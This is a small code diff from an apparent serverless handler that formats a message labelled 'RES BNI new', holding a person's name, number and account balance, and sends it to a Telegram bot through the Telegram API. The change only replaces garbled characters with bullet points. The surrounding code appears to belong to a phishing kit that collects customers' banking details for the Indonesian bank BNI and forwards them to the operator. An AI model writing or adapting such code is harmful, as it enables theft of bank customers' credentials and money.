@@ -12,9 +12,9 @@ export default async function handler(req, res) {
 ______________________________
 RES BNI new
 ______________________________
-¡H NAME : ${a}
-¡H NOMOR : ${b}
-¡H SALDO : ${c}
+• NAME : ${a}
+• NOMOR : ${b}
+• SALDO : ${c}
 ______________________________`;
 
     const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
